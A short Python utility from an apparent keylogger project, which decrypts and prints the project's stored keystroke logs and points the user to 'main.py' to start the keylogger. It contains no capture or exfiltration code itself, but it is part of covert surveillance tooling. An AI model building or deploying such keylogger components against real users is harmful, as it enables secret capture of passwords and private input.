#!/usr/bin/env python3
"""
View keystroke logs (decrypts if necessary)
"""

import config
from encryption_manager import EncryptionManager
from pathlib import Path

def view_keystrokes():
    """Decrypt and display keystroke logs"""
    
    keystroke_file = config.KEYSTROKE_LOG_FILE
    encrypted_file = keystroke_file.with_suffix(keystroke_file.suffix + '.enc')
    
    print("\n" + "="*80)
    print("🔍 VIEWING KEYSTROKE LOGS")
    print("="*80)
    
    # Check if encrypted version exists
    if encrypted_file.exists():
        print(f"\n[*] Found encrypted log: {encrypted_file.absolute()}")
        print("[*] Decrypting...")
        
        encryption = EncryptionManager()
        decrypted = encryption.decrypt_file(encrypted_file)
        
        if decrypted:
            keystroke_file = decrypted
        else:
            print("[!] Decryption failed")
            return
    
    # Read and display
    if keystroke_file.exists():
        print(f"\n[*] Reading from: {keystroke_file.absolute()}\n")
        print("="*80)
        
        with open(keystroke_file, 'r') as f:
            content = f.read()
            print(content)
        
        print("="*80)
        
        # Show file size
        size = keystroke_file.stat().st_size
        print(f"\nTotal size: {size} bytes")
    else:
        print("\n[!] No keystroke logs found")
        print(f"[i] Expected location: {keystroke_file.absolute()}")
        print("[i] Start the keylogger first: python3 main.py")

if __name__ == '__main__':
    view_keystrokes()
